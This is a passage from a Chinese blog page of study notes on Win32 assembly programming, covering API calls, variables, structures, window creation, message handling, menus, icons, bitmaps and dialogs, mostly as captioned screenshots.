src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201856489.png" alt="image-20230715201856489"></p><h3 id="动态链接库（dll）"><a href="#动态链接库（dll）" class="headerlink" title="动态链接库（dll）"></a>动态链接库（dll）</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715202519213.png" alt="image-20230715202519213"></p><h3 id="使用invoke语句"><a href="#使用invoke语句" class="headerlink" title="使用invoke语句"></a>使用invoke语句</h3><p><img src="C:\Users\12414\Desktop\image-20230715203657995.png" alt="image-20230715203657995"></p><h3 id="API函数的返回值"><a href="#API函数的返回值" class="headerlink" title="API函数的返回值"></a>API函数的返回值</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715203928273.png" alt="image-20230715203928273"></p><ol><li><p>返回值保存在<code>eax</code>寄存器当中‘</p></li><li><p>返回值都是4个字节。</p><p>如果超出4个字节的字符串，这个时候返回的就是指针（32位下的指针是4个字节）</p></li></ol><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715204231533.png" alt="image-20230715204231533"><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715204632946.png" alt="image-20230715204632946"></p><ol><li><p>使用<code>proto</code></p></li><li><p>距离</p><blockquote><p>win32是4G 的平坦段，无所谓距离</p><p>在Win32汇编中，函数定义时使用的距离（distance）是指函数内部的相对偏移量，用于表示函数内部的标签或指令之间的距离。</p><p>在汇编语言中，函数通常由一系列的指令组成，每个指令都有一个相对于函数起始地址的偏移量。这个偏移量被称为距离。</p></blockquote></li><li><p>对于win32汇编的参数值只有dword一种，也就是说只有4个字节</p></li></ol><h3 id="include语句"><a href="#include语句" class="headerlink" title="include语句"></a>include语句</h3><ol><li><p>包含头文件</p></li><li><p>包含的两个方式】</p><p><code>include &lt;头文件的名字&gt;</code></p><p><code>include 头文件的名字 </code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715215236758.png" alt="image-20230715215236758"></p></li></ol><h3 id="includelib"><a href="#includelib" class="headerlink" title="includelib"></a>includelib</h3><ol><li><p>导入库文件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715215645107.png" alt="image-20230715215645107"></p></li><li><p>一般库文件和动态链接库的名字相同，后缀不同</p></li><li><p>使用lib更像是一个借用，但是使用include是将文件拷贝到程序当中</p></li></ol><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/undefinedimage-20230716084312490.png" alt="image-20230716084312490"></p><ol><li><p>MB_OK是一个按钮，表示确定</p><p>具体的信息可以查vs的字典  </p></li><li><p>在win32汇编里面不需要使用je,jmp等</p><p>可以使用if,elseif,else </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716085208255.png" alt="image-20230716085208255"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716085421317.png" alt="image-20230716085421317"></p></li></ol><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><ol><li><p>可以理解为c语言的<code>goto</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090026683.png" alt="image-20230716090026683"></p></li><li><p>为了解决标号名称的浪费可以使用</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090405835.png" alt="image-20230716090405835"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090423891.png" alt="image-20230716090423891"></p></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><ol><li><p>类型</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090725511.png" alt="image-20230716090725511"></p></li></ol><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><ol><li><p>通过修改堆栈的指针<code>esp</code>来预留需要的空间</p><p>其实这个和C语言的调用是一样的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716091713070.png" alt="image-20230716091713070"></p></li><li><p>使用<code>local</code>定义局部变量</p></li><li><p>而且数据必须在代码之前 </p></li><li><p>局部变量的使用</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716093250606.png" alt="image-20230716093250606"></p></li><li><p>对局部变量的初始化</p><p><code>RtlZeroMemory</code>这个API函数经行初始化</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716094212170.png" alt="image-20230716094212170"></p></li></ol><h4 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h4><ol><li><p>强制类型转换</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716095945277.png" alt="image-20230716095945277"></p></li></ol><h4 id="变量的尺寸"><a href="#变量的尺寸" class="headerlink" title="变量的尺寸"></a>变量的尺寸</h4><ol><li><p>数据的长度计算</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716100100399.png" alt="image-20230716100100399"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716101511844.png" alt="image-20230716101511844"></p></li></ol><h4 id="获取变量的地址"><a href="#获取变量的地址" class="headerlink" title="获取变量的地址"></a>获取变量的地址</h4><ol><li><p>使用<code>lea</code></p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716102702916.png" alt="image-20230716102702916"></p></li><li><p>解析addr</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716104922959.png" alt="image-20230716104922959"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105002004.png" alt="image-20230716105002004"></p><p>在有addr的程序中，不用eax</p></li></ol><h3 id="使用子程序"><a href="#使用子程序" class="headerlink" title="使用子程序"></a>使用子程序</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105222790.png" alt="image-20230716105222790"></p><ol><li><p>相当于函数  </p></li><li><p>参数的传递和堆栈的平衡</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105929452.png" alt="image-20230716105929452"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716110042079.png" alt="image-20230716110042079"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716110153358.png" alt="image-20230716110153358"></p></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol><li>实现的语法</li></ol><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716111534344.png" alt="image-20230716111534344"></p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716111607802.png" alt="image-20230716111607802"> </p><p>   例子：</p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716112122258.png" alt="image-20230716112122258"></p><ol start="2"><li><p>实现引用</p><ul><li><p>使用点操作符</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716112706165.png" alt="image-20230716112706165"></p></li><li><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716122834546.png" alt="image-20230716122834546"></p></li><li><p>使用<code>assume</code>伪指令把寄存器预先定义为结构指针</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716123018164.png" alt="image-20230716123018164"></p></li></ul></li></ol><h2 id="win汇编的高级语法"><a href="#win汇编的高级语法" class="headerlink" title="win汇编的高级语法"></a>win汇编的高级语法</h2><ol><li>补充了：条件测试，分支和循环等高级语法</li></ol><h3 id="条件测试"><a href="#条件测试" class="headerlink" title="条件测试"></a>条件测试</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716125149179.png" alt="image-20230716125149179"></p><p> 但是注意条件判断的左边只能是变量，不能为常数；而且两边不能同时为变量，但可以是寄存器</p><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><ol><li><p>下面是格式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716125613059.png" alt="image-20230716125613059"></p></li></ol><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><ol><li><p>while语法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716131816020.png" alt="image-20230716131816020"></p><p>​<img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716131856832.png" alt="image-20230716131856832"></p><p>使用break 的时候我们记得指出退出的条件</p></li><li><p>do_while()语法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716133337992.png" alt="image-20230716133337992"></p></li></ol><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><h3 id="匈牙利命名法"><a href="#匈牙利命名法" class="headerlink" title="匈牙利命名法"></a>匈牙利命名法</h3><ol><li>格式是类型前缀加上变量说明</li></ol><ul><li><p>类型使用小写字母表示</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144300168.png" alt="image-20230716144300168"></p><p><code>sz</code>表示以0结尾的字符串，<code>dw</code>表示<code>double word </code>，<code>h</code>表示句柄</p><p>常用的前缀</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144512642.png" alt="image-20230716144512642"></p></li><li><p>变量名采用的双峰命名法</p></li></ul><ol start="2"><li><p>全局变量和局部变量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144924625.png" alt="image-20230716144924625"></p></li></ol><h3 id="代码的书写风格"><a href="#代码的书写风格" class="headerlink" title="代码的书写风格"></a>代码的书写风格</h3><ol><li><p>排版方式</p><p>对于指令和寄存器是不区分大小写</p><p>但是指令和寄存器等要使用小写字母</p><p>而用<code>equ</code>等位操作符定义的变量则使用大写的字母</p><p>变量和标号使用匈牙利表示法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716145044120.png" alt="image-20230716145044120"></p></li><li><p>注释和空行</p><p>总结的开说我们需要写合适的注释就好了，不要太多但是也不来能没有</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716145822421.png" alt="image-20230716145822421"></p></li><li><p>代码的组织模式</p></li></ol><h2 id="窗口程序执行过程"><a href="#窗口程序执行过程" class="headerlink" title="窗口程序执行过程"></a>窗口程序执行过程</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716151134078.png" alt="image-20230716151134078"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716153229377.png" alt="image-20230716153229377"></p><ol><li><p>使用satrt开始，endsatrt结束，但是需要添加<code>invokeExitProcess,NULL</code>，不然会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.code; 写在代码段<br>start:<br>invokeExitProcess,NULL   ;退出程序<br>end start   ;结束<br></code></pre></td></tr></table></figure></li><li><p>详细的过程</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716221210923.png" alt="image-20230716221210923"></p></li><li><p><code>PostMassage</code>和<code>SendMessage</code>主要是用于消息的转发机制</p></li><li><p>有两个问题</p></li></ol><ul><li><p>为什么windows调用窗口，直接处理信息不是更简单吗？</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716222442970.png" alt="image-20230716222442970"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716222503487.png" alt="image-20230716222503487"></p></li></ul><h2 id="窗口程序的解剖"><a href="#窗口程序的解剖" class="headerlink" title="窗口程序的解剖"></a>窗口程序的解剖</h2><h3 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h3><ol><li><p>可以理解为窗口的序号</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716223151317.png" alt="image-20230716223151317"></p></li><li><p>模块和句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224038899.png" alt="image-20230716224038899"></p><ul><li><p>得到句柄使用<code>GetModuleHandle</code></p></li><li><p>例子</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224248893.png" alt="image-20230716224248893"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224430994.png" alt="image-20230716224430994"></p><p>如果使用的参数是<code>NULL</code>那么我们就是调用的是调用者的句柄</p></li></ul></li></ol><h3 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717082341757.png" alt="image-20230717082341757"></p><ol><li><p>注册窗口类</p><p><code>RegisterClassEx</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717082647963.png" alt="image-20230717082647963"></p></li><li><p>创建窗口类</p><p><code>WNDCLASSEX</code>的结构各字段的含义 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083225200.png" alt="image-20230717083225200"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083339200.png" alt="image-20230717083339200"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083437467.png" alt="image-20230717083437467"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083618134.png" alt="image-20230717083618134"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717093314962.png" alt="image-20230717093314962"></p></li><li><p>建立窗口 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094332560.png" alt="image-20230717094332560"></p><p>建立窗口的函数CreatWindowEx&#96;</p><p>下面是使用方法：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094412098.png" alt="image-20230717094412098"></p><p>第二个参数<code>IpClassName</code>就是表明使用的窗口的类型，这里使用自己自定义的窗口</p><p>第三个参数是<code>IpWindowName</code>这个是窗口的名称</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094815772.png" alt="image-20230717094815772"></p><p>第十个参数是菜单的句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094842573.png" alt="image-20230717094842573"></p><p>第十一个参数<code>HInstance</code>指定窗口所属的层序模块</p><p>第九个参数<code>hWndParent</code>设置父窗口</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095031636.png" alt="image-20230717095031636"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095105968.png" alt="image-20230717095105968"></p><p>第四个参数<code>dwstyle</code> 指出需要的风格（预定的值可以查看）</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095138524.png" alt="image-20230717095138524"></p></li></ol><h3 id="ShowWindow"><a href="#ShowWindow" class="headerlink" title="ShowWindow"></a><code>ShowWindow</code></h3><p>主要是显示窗口和控制窗口的显示状态</p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095741377.png" alt="image-20230717095741377"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095916043.png" alt="image-20230717095916043"></p><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101238518.png" alt="image-20230717101238518"></p><p>一般形式：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101314519.png" alt="image-20230717101314519"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101430013.png" alt="image-20230717101430013"></p><p>当指定没有信息的不在获取cpu时间片</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717102012261.png" alt="image-20230717102012261"></p><p>我们使用的是<code>PeekMessage</code>加上条件判断来控制cpu的时间片的</p><h3 id="窗口过程"><a href="#窗口过程" class="headerlink" title="窗口过程"></a>窗口过程</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717102555823.png" alt="image-20230717102555823"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717103506340.png" alt="image-20230717103506340"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717103942765.png" alt="image-20230717103942765"></p><p>下面这张图的意思就是说我们不能直接使用DestroyWindow来摧毁窗口。而是我们使用<code>PodtQuiTMessage</code>来摧毁信息回环机制</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717104354934.png" alt="image-20230717104354934"></p><h2 id="关于程序接受信息的顺序"><a href="#关于程序接受信息的顺序" class="headerlink" title="关于程序接受信息的顺序"></a>关于程序接受信息的顺序</h2><ol><li><p>在使用<code>CreatWindowEx</code>时发送窗口接收到的信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717105407878.png" alt="image-20230717105407878"></p></li><li><p>使用DestroyWindow摧毁窗口的时候发送的信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143337820.png" alt="image-20230717143337820"></p><p>大部分的信息都不需要程序自己关心，windows只是尽义务的通知窗口过程而已</p><p>下面是程序需要自己关心的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143452332.png" alt="image-20230717143452332"></p><p>  <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143731304.png" alt="image-20230717143731304"></p></li><li><p><code>Defwindowproc</code>信息的默认处理机制</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717144409193.png" alt="image-20230717144409193"></p></li></ol><h2 id="窗口间的消息互发"><a href="#窗口间的消息互发" class="headerlink" title="窗口间的消息互发"></a>窗口间的消息互发</h2><ol><li><p>主要是使用<code>PostMessage</code>和<code>SendMessage</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717144914095.png" alt="image-20230717144914095"></p></li><li><p>类似于<code>printf</code>的函数<code>wsprintf</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717145123909.png" alt="image-20230717145123909"></p></li><li><p>为什么字符串的地址不一样</p><blockquote><p>因为windows对字符串进行了拷贝</p></blockquote><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151631460.png" alt="image-20230717151631460"></p></li></ol><h2 id="在窗口见传递数据"><a href="#在窗口见传递数据" class="headerlink" title="在窗口见传递数据"></a>在窗口见传递数据</h2><ol><li><p>使用<code>WM_COPYDATA</code>信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151827583.png" alt="image-20230717151827583"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151940270.png" alt="image-20230717151940270"></p><p>类似于C语言的传址的传参</p><p>因为使用的是共享的内存</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717152252202.png" alt="image-20230717152252202"></p></li><li><p><code>SendMessage</code>和<code>PostMessage</code>的区别</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717153331916.png" alt="image-20230717153331916"></p></li></ol><h2 id="实践性"><a href="#实践性" class="headerlink" title="实践性"></a>实践性</h2><h3 id="使用资源"><a href="#使用资源" class="headerlink" title="使用资源"></a>使用资源</h3><ol><li>程序运行&#x3D;代码的创建+资源的运行</li><li>源文件是以<code>rc</code>为扩展名的脚本文件</li></ol><h3 id="菜单的定义框架"><a href="#菜单的定义框架" class="headerlink" title="菜单的定义框架"></a>菜单的定义框架</h3><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160403774.png" alt="image-20230717160403774"></p><ul><li><p>方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160636378.png" alt="image-20230717160636378"></p></li><li><p>方法一：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160711329.png" alt="image-20230717160711329"></p></li><li><p>方法二：定义的是菜单项之间的分割线</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160919253.png" alt="image-20230717160919253"></p></li><li><p>方法三</p><p>定义的是子菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717161052164.png" alt="image-20230717161052164"></p></li></ul><h3 id="加载菜单和加速键"><a href="#加载菜单和加速键" class="headerlink" title="加载菜单和加速键"></a>加载菜单和加速键</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717173039779.png" alt="image-20230717173039779"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717173321243.png" alt="image-20230717173321243"></p><h3 id="菜单项的修改"><a href="#菜单项的修改" class="headerlink" title="菜单项的修改"></a>菜单项的修改</h3><ol><li><p>插入菜单项</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174026872.png" alt="image-20230717174026872"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174205538.png" alt="image-20230717174205538"></p></li><li><p>修改菜单项</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174234587.png" alt="image-20230717174234587"></p></li><li><p>删除菜单项</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\汇编\win32汇编.assets\image-20230717174312970.png" alt="image-20230717174312970"></p><p>区别：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174402830.png" alt="image-20230717174402830"></p></li><li><p>添加系统菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174850382.png" alt="image-20230717174850382"></p></li><li><p>右键弹出菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174937533.png" alt="image-20230717174937533"></p></li><li><p>二级菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175138449.png" alt="image-20230717175138449"></p></li><li><p>获取鼠标的位置</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175240029.png" alt="image-20230717175240029"></p></li><li><p>菜单窗台的检测</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717175615607.png" alt="image-20230717175615607"></p></li></ol><h2 id="图标和光标"><a href="#图标和光标" class="headerlink" title="图标和光标"></a>图标和光标</h2><ol><li><p>定义</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718083711673.png" alt="image-20230718083711673"></p></li><li><p>装载图标和光标</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718083931575.png" alt="image-20230718083931575"></p><p>通过发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084236722.png" alt="image-20230718084236722"></p></li><li><p>改变窗口的属性然后改变光标的设定</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084346721.png" alt="image-20230718084346721"></p></li></ol><h2 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h2><ol><li><p>是一种存储方式</p><p>linux也是这种</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084711472.png" alt="image-20230718084711472"></p></li><li><p>矢量和位图的关系</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718084955790.png" alt="image-20230718084955790"></p></li><li><p>区分位图，设备无关位图，位图文件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085112936.png" alt="image-20230718085112936"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085332659.png" alt="image-20230718085332659"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085306650.png" alt="image-20230718085306650"></p></li><li><p>在资源中定义位图</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718085919241.png" alt="image-20230718085919241"></p></li></ol><h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><ol><li><p>模态对话框和非模块对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718090141825.png" alt="image-20230718090141825">相当于特殊的窗口</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718090259854.png" alt="image-20230718090259854"></p></li><li><p>对话框的创建</p><p><img 